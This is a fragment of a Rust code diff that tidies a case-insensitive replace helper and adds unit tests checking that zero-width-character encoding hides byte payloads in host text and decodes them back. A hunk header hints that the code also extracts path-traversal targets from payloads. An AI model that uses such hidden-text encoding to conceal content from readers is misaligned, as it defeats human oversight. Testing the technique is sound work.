 fn replace_case_insensitive(text: &str, from: &str, to: &str) -> String {
-    if from.is_empty() { return text.to_string(); }
+    if from.is_empty() {
+        return text.to_string();
+    }
     let pattern = regex::escape(from);
     match regex::Regex::new(&format!("(?i){}", pattern)) {
         Ok(re) => re.replace(text, to).into_owned(),
@@ -1701,3 +1924,36 @@ fn extract_traversal_target(payload: &str) -> Option<String> {
     None
 }
 
+#[cfg(test)]
+mod tests {
+    use super::{decode_zero_width, encode_zero_width};
+
+    fn round_trip(payload: &[u8]) {
+        let encoded = encode_zero_width(payload);
+        let decoded = decode_zero_width(&encoded);
+        assert_eq!(decoded, payload); // audit-allow: test
+    }
+
+    #[test]
+    fn zero_width_round_trips_every_residue() {
+        // Hits every (8N mod 3) padding case: 0,1,2 bits trailing.
+        for n in 0..=24 {
+            let payload: Vec<u8> = (0..n).map(|i| (i as u8).wrapping_mul(31)).collect();
+            round_trip(&payload);
+        }
+    }
+
+    #[test]
+    fn zero_width_decoder_skips_host_text() {
+        let payload = b"hidden\x00\xff";
+        let stego = format!("prefix {} suffix", encode_zero_width(payload));
+        let decoded = decode_zero_width(&stego);
+        assert_eq!(decoded, payload); // audit-allow: test
+    }
+
+    #[test]
+    fn zero_width_decoder_handles_empty() {
+        assert_eq!(decode_zero_width(""), Vec::<u8>::new()); // audit-allow: test
+        assert_eq!(decode_zero_width("no zero width here"), Vec::<u8>::new()); // audit-allow: test
+    }
+}
